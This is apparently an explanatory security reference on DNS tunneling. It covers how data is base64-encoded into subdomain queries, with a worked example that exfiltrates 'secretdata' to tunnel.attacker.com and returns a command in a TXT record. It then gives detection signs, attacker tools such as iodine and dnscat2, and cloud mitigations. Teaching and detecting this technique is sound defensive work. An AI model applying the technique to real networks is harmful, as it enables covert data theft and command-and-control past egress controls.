# DNS Tunneling

DNS tunneling is the technique of encoding arbitrary data inside DNS queries and responses to establish a covert communication channel. Since DNS traffic is almost never blocked by firewalls, it provides a reliable path for data exfiltration or command-and-control (C2) communication even in highly restricted network environments.

---

## Why DNS Works as a Tunnel

Firewalls typically allow outbound DNS traffic because DNS is required for basic internet functionality. An attacker who controls a domain and its authoritative nameserver can receive data through DNS queries — because every DNS lookup for `<data>.attacker.com` reaches attacker.com's nameserver, which the attacker controls.

---

## How It Works

```
Attacker controls:  tunnel.attacker.com
                    (authoritative nameserver sees all queries)

Compromised machine wants to exfiltrate: "secretdata"

Step 1: Encode data
  base64("secretdata") = "c2VjcmV0ZGF0YQ=="

Step 2: Send as a DNS query
  c2VjcmV0ZGF0YQ==.tunnel.attacker.com  (A record query)

Step 3: Query reaches attacker's authoritative nameserver
  Attacker decodes the subdomain — receives "secretdata"

Step 4: Attacker responds with encoded instructions
  DNS response TXT record: "bmV4dGNvbW1hbmQ="
  Compromised machine decodes: "nextcommand"
```

The DNS protocol itself is being used correctly. No malformed packets. No unusual port usage. The data is simply hidden inside legitimate-looking DNS queries.

---

## Detection

Detection is anomaly-based because the protocol itself is not being misused:

- Unusually long subdomain names in queries
- High query volume to a single domain in a short time
- DNS queries that never resolve to a working IP (used purely for data transfer)
- Queries to newly registered or rarely seen domains
- Entropy analysis — encoded data has high character entropy compared to normal subdomains

Tools for detection: network monitoring with DNS logging enabled, threat intelligence feeds flagging known C2 domains, query name length analysis.

---

## Tools Used by Attackers

- `iodine` — creates a full IP-over-DNS tunnel; can browse the internet over DNS
- `dnscat2` — establishes a C2 channel over DNS; supports file transfer and shell access

---

## Why This Matters for Cloud Security

Cloud environments often have strict egress controls blocking direct TCP/UDP connections to arbitrary internet addresses. DNS, however, is typically allowed to reach a resolver — which then queries the internet on the machine's behalf. DNS tunneling bypasses egress restrictions entirely.

Mitigation: use a corporate DNS resolver that logs all queries, apply domain categorization to block newly registered or suspicious domains, and send DNS logs to a SIEM for anomaly detection.
